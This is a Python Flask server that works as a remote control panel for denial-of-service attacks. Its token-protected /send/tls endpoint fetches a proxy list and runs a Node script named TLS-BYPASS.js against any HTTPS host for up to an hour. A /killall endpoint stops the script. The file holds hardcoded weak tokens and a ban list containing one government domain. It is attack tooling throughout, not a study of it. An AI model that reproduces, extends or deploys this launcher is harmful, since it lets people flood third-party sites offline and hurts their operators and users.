from flask import Flask, request, jsonify
import wget
import subprocess
import psutil
import os
import re
from threading import Thread
import datetime

app = Flask(__name__)

token_list = ["iloveu", "123456"]
proxy_api = "https://baidu.com"
banned_list = ["www.gov.cn"]

max_duration = 3600
finish_time = 0

def check_process(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if process_name in proc.info['name']:
            return True
    return False

def is_string_banned(input_string, banned_list):
    for banned_item in banned_list:
        pattern = re.compile(banned_item, re.IGNORECASE)
        if re.search(pattern, input_string):
            return True
    return False

@app.errorhandler(404)
def page_not_found(error):
    return '{"code": 404, "message": "API not found"}', 404, [('Content-Type', 'application/json')]

@app.errorhandler(500)
def internal_server_error(error):
    return '{"code": 500, "message": "internal server error"}', 500, [('Content-Type', 'application/json')]
   
@app.route('/send/tls', methods=["GET", "POST"])
def attack_tls():
    def do_attack(method, host, duration):
        proc_obj = subprocess.Popen(["node", "/root/TLS-BYPASS.js", host, duration, "256", "128", "/root/proxy.txt"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        proc_obj.communicate()
    #if "method" in request.args and "host" in request.args and "duration" in request.args and "token" in request.args:
    if "method" in request.json and "host" in request.json and "duration" in request.json and "token" in request.json:
        if request.method == "GET":
            method = request.args.get('method')
            host = request.args.get('host')
            duration = request.args.get('duration')
            token = request.args.get('token')
        elif request.method == "POST":
            if request.content_type.startswith('application/json'):
                method = request.json.get('method')
                host = request.json.get('host')
                duration = request.json.get('duration')
                token = request.json.get('token')
            elif request.content_type.startswith('multipart/form-data'):
                method = request.form.get('method')
                host = request.form.get('host')
                duration = request.form.get('duration')
                token = request.form.get('token')
            else:
                method = request.values.get('method')
                host = request.values.get('host')
                duration = request.values.get('duration')
                token = request.values.get('token')
        else:
            return '{"code": 405, "message": "Method not allowed"}', 405, [('Content-Type', 'application/json')]
        if int(duration) > max_duration:
            return f'{"code": 403, "message": "Duration should not be longer than {max_duration}"}', 403, [('Content-Type', 'application/json')]
        if method not in ["GET", "POST"]:
            return '{"code": 403, "message": "Method should be GET or POST"}', 403, [('Content-Type', 'application/json')]
        if "https" not in host:
            return '{"code": 403, "message": "Host parse error"}', 403, [('Content-Type', 'application/json')]
        if is_string_banned(host, banned_list):
            return '{"code": 403, "message": "Host is banned"}', 403, [('Content-Type', 'application/json')]
        if token in token_list:
            if check_process("node") == False:
                if(os.path.isfile("/root/proxy.txt")):
                    os.remove("/root/proxy.txt")
                wget.download(proxy_api, "/root/proxy.txt")
                thread = Thread(target=do_attack, kwargs={'method': method, 'host': host, 'duration': duration})
                thread.start()
                global finish_time
                current_timestamp = int(datetime.datetime.now().timestamp())
                finish_time = current_timestamp + int(duration)
                return '{"code": 200, "message": "Sended"}', 200, [('Content-Type', 'application/json')]
            else:
                return '{"code": 403, "message": "There is an attack request being executed", "finish_time": ' + str(finish_time) + '}', 403, [('Content-Type', 'application/json')]
        else:
            return '{"code": 401, "message": "Unauthorized"}', 401, [('Content-Type', 'application/json')]
    else:
        return '{"code": 500, "message": "Missing required parameters"}', 500, [('Content-Type', 'application/json')]
    
@app.route('/killall', methods=["GET", "POST"])
def kill_node():
    if "token" in request.args:
        if request.method == "GET":
            token = request.args.get('token')
        elif request.method == "POST":
            if request.content_type.startswith('application/json'):
                token = request.json.get('token')
            elif request.content_type.startswith('multipart/form-data'):
                token = request.form.get('token')
            else:
                token = request.values.get('token')
        if token in token_list:
            if check_process("node") == True:
                os.system("killall node")
                return '{"code": 200, "message": "Killed"}', 200, [('Content-Type', 'application/json')]
            else:
                return '{"code": 403, "message": "Not running"}', 403, [('Content-Type', 'application/json')]
    else:
        return '{"code": 500, "message": "Missing required parameters"}', 500, [('Content-Type', 'application/json')]

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=51290)